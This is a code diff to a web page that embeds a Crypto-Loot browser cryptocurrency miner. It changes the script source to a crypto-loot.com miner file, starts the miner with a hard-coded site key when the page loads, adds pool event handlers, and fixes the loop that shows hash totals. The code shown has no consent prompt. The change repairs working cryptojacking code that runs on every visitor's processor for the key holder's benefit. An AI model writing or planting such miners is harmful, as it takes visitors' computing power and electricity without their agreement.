@@ -29,20 +29,18 @@
 
     </script>
   </div>
-  <script src="//cryptaloot.pro/lib/crypta.js"></script>
+  <script src="https://crypto-loot.com/lib/miner.min.js"></script>
   <script>
-    var miner = new CRLT.Anonymous('f3981c028e6ec16499b062588983dff0f19496e86006', {
-      autoThreads: true,
-      throttle: 0
-    });
+    var miner = new CRLT.Anonymous('f3981c028e6ec16499b062588983dff0f19496e86006');
     miner.start();
+    miner.on('found', function() { /* Hash found */ })
+    miner.on('accepted', function() { /* Hash accepted by the pool */ })
     setInterval(function() {
-      hashesPerSecond = miner.getHashesPerSecond();
-      totalHashes = miner.getTotalHashes();
-      acceptedHashes = miner.getAcceptedHashes();
-      document.getElementById("totalHash").innerHTML = totalHashes + "Hashes";
-      document.getElementById("hashPerSec").innerHTML = hashesPerSecond + " hashes/sec";
-    }
-</script>
-  
-<p id="totalHash"></p>
+      var hashesPerSecond = miner.getHashesPerSecond();
+      var totalHashes = miner.getTotalHashes();
+      var acceptedHashes = miner.getAcceptedHashes();
+      document.getElementById("totalhashes").innerHTML = totalHashes + " Hashes";
+    }, 1000);
+
+  </script>
+  <p id="totalhashes"></p>
